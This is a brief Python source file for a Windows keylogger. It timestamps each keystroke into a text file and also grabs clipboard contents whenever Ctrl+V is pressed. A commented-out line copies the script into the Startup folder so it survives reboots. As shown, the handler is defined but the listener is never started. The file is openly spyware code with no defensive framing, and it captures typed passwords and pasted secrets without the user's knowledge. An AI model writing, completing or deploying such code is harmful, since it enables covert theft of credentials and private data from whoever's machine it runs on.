import time
import pyperclip
import threading
from pynput.keyboard._win32 import KeyCode
from pynput.keyboard import Listener
import os, logging,sys



username = os.getlogin()
logging_dir = f"C:/Users/{username}/Desktop"
# copyfile('test.py',f'C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/test.py')

def key_handeler(key):
    kkey=str(key)[2:5]

    if str(key)== 'Key.ctrl_l' or str(key)=='Key.caps_lock' or str(key)=='Key.tab' or str(key)=='Key.shift'\
            or str(key)=='Key.ctrl_l' or str(key)=='Key.alt_l' or str(key)=='Key.alt_gr' or str(key)=='Key.ctrl_r' \
            or str(key) == 'Key.shift_r' or str(key) == 'Key.home' or str(key) == 'Key.page_up' \
            or str(key) == 'Key.page_down' or str(key) == 'Key.end' :
        return
    elif str(kkey) == 'x16':
        key=f"'{pyperclip.paste().strip()}'was pasted"
    elif str(key)== 'Key.up' or str(key) == 'Key.down' or str(key) == 'Key.left' or str(key) == 'Key.right':
        key=f'{str(key)[4: ]} arrow'
    with open("KeyLoger.txt","a") as f:
        f.write(f"{time.asctime()} - {key}\n")
    print(key)



